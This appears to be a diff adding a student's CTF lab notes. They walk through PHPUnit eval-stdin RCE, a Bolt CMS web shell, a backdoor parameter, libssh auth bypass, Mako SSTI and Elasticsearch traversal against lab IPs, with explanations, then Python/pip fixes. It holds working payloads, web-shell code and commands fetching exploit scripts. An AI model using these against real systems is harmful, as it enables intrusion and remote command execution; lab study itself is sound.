@@ -1,0 +1,185 @@
+PHP unit: git clone https://github.com/maurosoria/dirsearch.git
+python3 dirsearch.py -u
+http://34.185.133.186:32232/
+/composer.json for version in url!!
+POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+<?php system('cat /flag.txt'); ?>
+*  How we did it and why: We used dirsearch to find an exposed /vendor/ folder containing PHPUnit. We checked composer.json to confirm the vulnerable version. Then, we sent a POST request to eval-stdin.php with our payload in the body. This works because CVE-2017-9841 allows remote attackers to execute arbitrary PHP code. The vulnerability exists because eval-stdin.php uses file_get_contents('php://input') to read raw data from the HTTP request body and passes it directly into an eval() function, executing our code. 
+* 
+* 
+* 
+* PHP unit: sudo apt install dirsearch 
+* 
+* dirsearch -u http://34.185.133.186:32232/
+* /composer.json for version in url!! POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+* <?php system('cat /flag.txt'); ?>
+* How we did it and why: We used dirsearch to find an exposed /vendor/ folder containing PHPUnit. We checked composer.json to confirm the vulnerable version. Then, we sent a POST request to eval-stdin.php with our payload in the body. This works because CVE-2017-9841 allows remote attackers to execute arbitrary PHP code. The vulnerability exists because eval-stdin.php uses file_get_contents('php://input') to read raw data from the HTTP request body and passes it directly into an eval() function, executing our code.
+* 
+* 
+* 
+* 
+* 
+*  
+Bolt: http://34.40.39.172:31937/bolt
+admin password
+phttp://34.179.187.228:31937/theme/base-2016/bolt.php?cmd=ls%20/
+http://34.179.187.228:31937/theme/base-2016/bolt.php?cmd=cat%20/flag.txt
+*  How we did it and why: We logged into the CMS and created a PHP payload <?php echo system($_GET['cmd']);?>. We couldn't upload it as a .php file due to security filters , so we uploaded it as rce.html. We then used the File Management dashboard's "Options" menu to rename the file to rce.php. This works because of a logic flaw: the web application blocked dangerous file extensions during the upload phase, but completely forgot to restrict file extensions during the renaming phase, allowing us to create an executable web shell. 
+* 
+* 
+* 
+* 
+* 
+* Bolt: http://34.40.39.172:31937/bolt admin password
+* phttp://34.179.187.228:31937/theme/base-2016/bolt.php?cmd=ls%20/ http://34.179.187.228:31937/theme/base-2016/bolt.php?cmd=cat%20/flag.txt
+* How we did it and why: We logged into the CMS and created a PHP payload <?php echo system($_GET['cmd']);?>. We couldn't upload it as a .php file due to security filters, so we uploaded it as rce.html. We then used the File Management dashboard's "Options" menu to rename the file to rce.php. This works because of a logic flaw: the web application blocked dangerous file extensions during the upload phase, but completely forgot to restrict file extensions during the renaming phase, allowing us to create an executable web shell.
+* 
+*  
+nondiff-backdoor:
+dirsearch % python3 dirsearch.py -u http://34.89.177.221:30919/ -t 50
+wget/curl -o backup.zip
+unzip
+grep -r "shell_exec(" -n .
+http://34.89.177.221:30919/?welldone=knockknock&shazam=cat%20flag.php
+http://34.89.177.221:30919/?welldone=knockknock&shazam=grep%20-r%20CTF
+*  How we did it and why: We fuzzed the server using dirsearch and discovered a backup.zip file. We downloaded and unzipped it to analyze the source code. Knowing the app uses PHP, we used grep to search for vulnerable functions like shell_exec(). We found a hidden backdoor function that triggers when welldone=knockknock is provided in the URL, allowing the shazam parameter to execute commands. This works because a backdoor is malicious code added to a website allowing an attacker to bypass normal logins and execute commands undetected.  
+nondiff-backdoor: dirsearch -u http://34.89.177.221:30919/ -t 50
+wget http://34.89.177.221:30919/backup.zip unzip backup.zip grep -r "shell_exec(" -n . http://34.89.177.221:30919/?welldone=knockknock&shazam=cat%20flag.php http://34.89.177.221:30919/?welldone=knockknock&shazam=grep%20-r%20CTF
+*  How we did it and why: We fuzzed the server using dirsearch and discovered a backup.zip file. We downloaded and unzipped it to analyze the source code. Knowing the app uses PHP, we used grep to search for vulnerable functions like shell_exec(). We found a hidden backdoor function that triggers when welldone=knockknock is provided in the URL, allowing the shazam parameter to execute commands. This works because a backdoor is malicious code added to a website allowing an attacker to bypass normal logins and execute commands undetected.
+
+
+
+
+Libbsh :
+nmap -sV -sC -p 31276 34.185.190.1 -Pn
+libssh 0.8.3 (protocol 2.0) vulnerability!!!
+curl -sL https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw -o libssh.py
+python3 libssh.py 34.185.190.1 -p 31276 -c "cd ..;cat flag.txt"
+*  How we did it and why: We used Nmap to scan the target port and identified it was running libssh 0.8.3. We downloaded a specific python exploit for CVE-2018-10993 and executed it against the target. This works because this specific version of libssh contains an authentication bypass vulnerability. The exploit attacks the library by accessing the SSH server without prior authentication, effectively opening a secure shell channel without needing a password. 
+* 
+* 
+* nmap -sV -sC -p 31276 34.185.190.1 -Pn
+* libssh 0.8.3 (protocol 2.0) vulnerability!!!
+* curl -sL https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw -o libssh.py
+* python3 libssh.py 34.185.190.1 -p 31276 -c "cd ..;cat flag.txt"
+*  How we did it and why: We used Nmap to scan the target port and identified it was running libssh 0.8.3. We downloaded a specific python exploit for CVE-2018-10993 and executed it against the target. This works because this specific version of libssh contains an authentication bypass vulnerability. The exploit attacks the library by accessing the SSH server without prior authentication, effectively opening a secure shell channel without needing a password.
+* 
+* 
+* 
+* 
+*  
+Shark: Server-Side Template Injection
+${7*7}
+${import('os').popen('cat flag').read()}
+*  How we did it and why: We tested the input field by submitting mathematical payloads like ${7*7}. When the server returned 49, we proved the application was vulnerable to Server-Side Template Injection (SSTI). We then injected a Python OS command payload specifically designed for the Mako template engine. This works because the template engine unsafely embeds user input directly into the template and evaluates it server-side, allowing our payload to escape the template sandbox and execute system commands.
+* 
+* 
+* 
+* 
+* 
+* Shark: Server-Side Template Injection ${7*7} ${import('os').popen('cat flag').read()}
+*  How we did it and why: We tested the input field by submitting mathematical payloads like ${7*7}. When the server returned 49, we proved the application was vulnerable to Server-Side Template Injection (SSTI). We then injected a Python OS command payload specifically designed for the Mako template engine. This works because the template engine unsafely embeds user input directly into the template and evaluates it server-side, allowing our payload to escape the template sandbox and execute system commands.
+*   
+Elastic:
+sudo apt install exploitdb
+sudo apt install libxml2-utils
+Search for the exploit:
+searchsploit elasticsearch
+Download the exploit:
+curl -sL https://raw.githubusercontent.com/nixawk/labs/master/CVE-2015-5531/exploit.py -o exploit_elastic.py
+python3 -m pip install requests if needed
+Run the exploit:
+python3 exploit_elastic.py http://TARGET_IP:PORT /etc/passwd
+*  How we did it and why: We installed ExploitDB and its dependencies. We searched the database and found that Elasticsearch versions < 1.4.5 / < 1.5.2 are vulnerable to a Directory Traversal attack. We downloaded the Python exploit for CVE-2015-5531 and ran it against our target to read the /etc/passwd file. This works because the vulnerability allows remote attackers to read arbitrary files via unspecified vectors related to snapshot API calls, meaning the server does not properly restrict file paths, letting us traverse outside the web directory. 
+* 
+* 
+* Elastic:
+* sudo apt update sudo apt install exploitdb sudo apt install libxml2-utils
+* 
+* 
+* Search for the exploit: searchsploit elasticsearch
+* 
+* 
+* Download the exploit:
+* curl -sL https://raw.githubusercontent.com/nixawk/labs/master/CVE-2015-5531/exploit.py -o exploit_elastic.py
+* python3 -m pip install requests if needed
+* Run the exploit:
+* python3 exploit_elastic.py http://TARGET_IP:PORT /etc/passwd
+*  How we did it and why: We installed ExploitDB and its dependencies. We searched the database and found that Elasticsearch versions < 1.4.5 / < 1.5.2 are vulnerable to a Directory Traversal attack. We downloaded the Python exploit for CVE-2015-5531 and ran it against our target to read the /etc/passwd file. This works because the vulnerability allows remote attackers to read arbitrary files via unspecified vectors related to snapshot API calls, meaning the server does not properly restrict file paths, letting us traverse outside the web directory.
+*        1. Python or Pip is Completely Missing / Command Not Found
+* If typing python3 or pip3 gives you a "command not found" error, the system packages might be missing.
+* Bash
+* 
+* # 1. Update your package lists first
+* sudo apt update
+* 
+* # 2. Install Python3, Pip, and the Venv module all at once
+* sudo apt install python3 python3-pip python3-venv -y
+* 
+* # 3. Check where they are installed
+* which python3
+* which pip3
+* Why: Ubuntu and Kali sometimes ship minimal installations. You need to explicitly tell the apt package manager to fetch the core Python tools.
+* 2. The "venv" Module is Missing (Exit Status 1)
+* If you try to run python3 -m venv venv and it fails saying the module is not found or throws an error.
+* Bash
+* 
+* # 1. Install the specific venv package (often separated in Debian/Ubuntu)
+* sudo apt install python3-venv -y
+* 
+* # 2. Try creating the environment again
+* python3 -m venv venv
+* 
+* # 3. Activate it
+* source venv/bin/activate
+* Why: In Debian-based systems (like Kali and Ubuntu), the venv module isn't always bundled with the base python3 package to save space. You have to install it separately.
+* 3. Pip is Broken, Missing, or Failing Inside an Environment
+* If your environment activates, but pip throws traceback errors or isn't found.
+* Bash
+* 
+* # 1. Try forcing Python to bootstrap pip natively
+* python3 -m ensurepip --upgrade
+* 
+* # 2. If ensurepip fails, download the official repair script
+* wget https://bootstrap.pypa.io/get-pip.py
+* 
+* # 3. Run the repair script (make sure your venv is activated if repairing a venv!)
+* python3 get-pip.py
+* 
+* # 4. Verify it works
+* python3 -m pip --version
+* Why: Sometimes virtual environments build improperly, or system updates break the pip binaries. The get-pip.py script bypasses the broken binaries and pulls a fresh, working copy directly from the Python Package Authority.
+* 4. "Externally Managed Environment" Error (The PEP 668 Block)
+* If you are on modern Kali Linux (2023.1+) or Ubuntu 23.04+ and try to run pip install requests outside of a virtual environment, you will get a massive red error saying "error: externally-managed-environment".
+* You have three ways to bypass this during an exam:
+* Option A: The Proper Way (Virtual Environment)
+* Bash
+* 
+* python3 -m venv venv
+* source venv/bin/activate
+* pip install requests
+* Option B: The Debian Way (Use APT instead of PIP) Instead of using pip, use the system package manager to install the Python library.
+* Bash
+* 
+* sudo apt install python3-requests
+* Option C: The "CTF Speed" Way (Force it) If you are in a rush and don't care about breaking your system Python packages (which is fine for a disposable exam VM), you can override the block.
+* Bash
+* 
+* pip install requests --break-system-packages
+* Why: Linux distributions recently locked down global pip installs to stop users from accidentally breaking OS-level tools that rely on Python. --break-system-packages tells the OS to ignore the safety rails.
+* 5. General Maintenance & Sanity Checks
+* If scripts are acting weird or you suspect a version mismatch.
+* Bash
+* 
+* # See exactly which Python version is active
+* python3 --version
+* 
+* # See exactly which pip you are using (Is it global? Is it in a venv?)
+* pip3 -V
+* 
+* # List all installed packages in your current environment
+* pip3 list
+* 
+* # Deactivate a virtual environment when you are done
+* deactivate
+*  
